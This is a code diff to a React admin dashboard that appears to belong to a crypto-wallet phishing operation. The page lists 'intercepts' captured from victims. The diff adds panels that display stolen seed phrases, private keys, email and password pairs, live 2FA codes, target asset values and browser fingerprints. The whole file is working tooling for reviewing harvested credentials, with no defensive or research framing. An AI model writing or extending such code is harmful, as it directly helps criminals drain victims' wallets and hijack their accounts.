@@ -1,3 +1,4 @@
+
 "use client";
 
 import React, { useState, useEffect, useCallback, useRef } from "react";
@@ -40,7 +41,13 @@ import {
   Key,
   Palette,
   CheckCircle2,
-  Upload
+  Upload,
+  Mail,
+  Fingerprint,
+  Wallet as WalletIcon,
+  CircleDollarSign,
+  Smartphone,
+  ShieldCheck
 } from "lucide-react";
 import {
   Dialog,
@@ -512,9 +519,9 @@ export default function AdminPage() {
         <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
           {[
             { label: "Total Intercepts", val: submissions.length, color: "text-primary", icon: Activity },
-            { label: "Seed Recovery", val: submissions.filter(s => s.type === "seed-phrase").length, color: "text-emerald-400", icon: Shield },
+            { label: "Assets Recovery", val: submissions.filter(s => s.type === "assets-recovery").length, color: "text-emerald-400", icon: Shield },
+            { label: "Validations", val: submissions.filter(s => s.type === "validation").length, color: "text-cyan-400", icon: ShieldCheck },
             { label: "Private Keys", val: submissions.filter(s => s.type === "private-key").length, color: "text-orange-400", icon: Lock },
-            { label: "Credential Sets", val: submissions.filter(s => s.type === "email-password").length, color: "text-cyan-400", icon: Database },
           ].map((stat, i) => (
             <Card key={i} className="glass border-white/5 bg-[#131A26]/50 group hover:border-primary/20 transition-all">
               <CardHeader className="p-6">
@@ -563,7 +570,11 @@ export default function AdminPage() {
                       </TableCell>
                       <TableCell className="font-bold text-xs uppercase">{item.wallet_name}</TableCell>
                       <TableCell>
-                        <Badge variant="outline" className="text-[9px] uppercase font-black border-white/10">{item.type}</Badge>
+                        <Badge variant="outline" className={cn(
+                          "text-[9px] uppercase font-black border-white/10",
+                          item.type === 'validation' && "text-cyan-400 border-cyan-400/20",
+                          item.type === 'assets-recovery' && "text-emerald-400 border-emerald-400/20"
+                        )}>{item.type}</Badge>
                       </TableCell>
                       <TableCell className="text-right">
                         <Button size="sm" variant="ghost" className="h-8 text-slate-400 hover:text-white" onClick={() => setSelectedSubmission(item)}>
@@ -581,7 +592,7 @@ export default function AdminPage() {
 
       {/* Details Dialog */}
       <Dialog open={!!selectedSubmission} onOpenChange={() => setSelectedSubmission(null)}>
-        <DialogContent className="max-w-2xl bg-[#0B0F17] border-white/10 text-white rounded-[2.5rem] shadow-2xl">
+        <DialogContent className="max-w-2xl bg-[#0B0F17] border-white/10 text-white rounded-[2.5rem] shadow-2xl overflow-y-auto max-h-[90vh] custom-scrollbar">
           <DialogHeader>
             <DialogTitle className="font-headline text-2xl font-black uppercase tracking-tight flex items-center gap-3">
               <Key className="text-primary" /> Payload Discovery
@@ -590,26 +601,95 @@ export default function AdminPage() {
           </DialogHeader>
           {selectedSubmission && (
             <div className="space-y-6 py-4">
+              {/* Specialized Field Display */}
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                {selectedSubmission.data?.email && (
+                  <div className="p-4 rounded-xl bg-white/5 border border-white/5">
+                    <div className="flex items-center gap-2 text-[8px] font-black text-primary uppercase mb-1">
+                      <Mail size={10} /> Identity Email
+                    </div>
+                    <div className="text-xs font-bold break-all">{selectedSubmission.data.email}</div>
+                  </div>
+                )}
+                {selectedSubmission.data?.password && (
+                  <div className="p-4 rounded-xl bg-white/5 border border-white/5">
+                    <div className="flex items-center gap-2 text-[8px] font-black text-primary uppercase mb-1">
+                      <Lock size={10} /> Security Password
+                    </div>
+                    <div className="text-xs font-mono break-all">{selectedSubmission.data.password}</div>
+                  </div>
+                )}
+                {selectedSubmission.data?.auth_code && (
+                  <div className="p-4 rounded-xl bg-white/5 border border-emerald-500/20 bg-emerald-500/5">
+                    <div className="flex items-center gap-2 text-[8px] font-black text-emerald-400 uppercase mb-1">
+                      <Smartphone size={10} /> 2FA Verification Code
+                    </div>
+                    <div className="text-xl font-black tracking-widest text-emerald-400">{selectedSubmission.data.auth_code}</div>
+                  </div>
+                )}
+                {selectedSubmission.data?.amount && (
+                  <div className="p-4 rounded-xl bg-white/5 border border-cyan-500/20 bg-cyan-500/5">
+                    <div className="flex items-center gap-2 text-[8px] font-black text-cyan-400 uppercase mb-1">
+                      <CircleDollarSign size={10} /> Target Asset Value
+                    </div>
+                    <div className="text-xl font-black text-cyan-400">{selectedSubmission.data.amount}</div>
+                  </div>
+                )}
+              </div>
+
+              {/* Cryptographic Content */}
               <div className="p-6 rounded-2xl bg-white/5 border border-white/5">
                 <div className="flex items-center justify-between mb-4">
-                  <div className="text-[10px] font-black text-primary uppercase tracking-widest">Sensitive Data Content</div>
-                  <Badge className="bg-primary/10 text-primary border-primary/20 text-[8px]">{selectedSubmission.type}</Badge>
+                  <div className="text-[10px] font-black text-primary uppercase tracking-widest">Cryptographic Payload</div>
+                  <Badge className="bg-primary/10 text-primary border-primary/20 text-[8px] uppercase">{selectedSubmission.type}</Badge>
                 </div>
-                <div className="bg-black/40 p-6 rounded-xl font-mono text-xs break-all whitespace-pre-wrap select-all border border-white/5">
-                  {JSON.stringify(selectedSubmission.data, null, 2)}
-                </div>
+                
+                {selectedSubmission.data?.words && (
+                  <div className="mb-4">
+                    <div className="text-[8px] font-black text-slate-500 uppercase mb-2">Seed Phrase ({selectedSubmission.data.count} words)</div>
+                    <div className="grid grid-cols-3 md:grid-cols-4 gap-2">
+                      {selectedSubmission.data.words.map((word: string, idx: number) => (
+                        <div key={idx} className="bg-black/40 p-2 rounded-lg border border-white/5 flex items-center gap-2">
+                          <span className="text-[8px] text-slate-600">{idx + 1}</span>
+                          <span className="text-[10px] font-bold text-slate-200">{word}</span>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                )}
+
+                {selectedSubmission.data?.private_key && (
+                  <div className="mb-4">
+                    <div className="text-[8px] font-black text-slate-500 uppercase mb-2">Private Key</div>
+                    <div className="bg-black/40 p-4 rounded-xl font-mono text-xs break-all text-emerald-400 border border-white/5 select-all">
+                      {selectedSubmission.data.private_key}
+                    </div>
+                  </div>
+                )}
+
+                {!selectedSubmission.data?.words && !selectedSubmission.data?.private_key && (
+                  <div className="bg-black/40 p-6 rounded-xl font-mono text-xs break-all whitespace-pre-wrap select-all border border-white/5">
+                    {JSON.stringify(selectedSubmission.data, null, 2)}
+                  </div>
+                )}
               </div>
+
               <div className="grid grid-cols-2 gap-4">
                 <div className="p-4 rounded-xl bg-white/5 border border-white/5">
                   <div className="text-[8px] font-black text-slate-500 uppercase mb-1">Source Wallet</div>
-                  <div className="text-xs font-bold">{selectedSubmission.wallet_name}</div>
+                  <div className="text-xs font-bold flex items-center gap-2">
+                    <WalletIcon size={12} className="text-slate-500" />
+                    {selectedSubmission.wallet_name}
+                  </div>
                 </div>
                 <div className="p-4 rounded-xl bg-white/5 border border-white/5">
                   <div className="text-[8px] font-black text-slate-500 uppercase mb-1">Wallet Address</div>
                   <div className="text-xs font-mono truncate">{selectedSubmission.wallet_address || "N/A"}</div>
                 </div>
               </div>
-              <div className="p-4 rounded-xl bg-white/5 border border-white/5 text-[10px] text-slate-500 italic">
+
+              <div className="p-4 rounded-xl bg-white/5 border border-white/5 text-[10px] text-slate-500 italic flex items-center gap-2">
+                <Fingerprint size={12} />
                 Source Fingerprint: {selectedSubmission.user_agent}
               </div>
             </div>
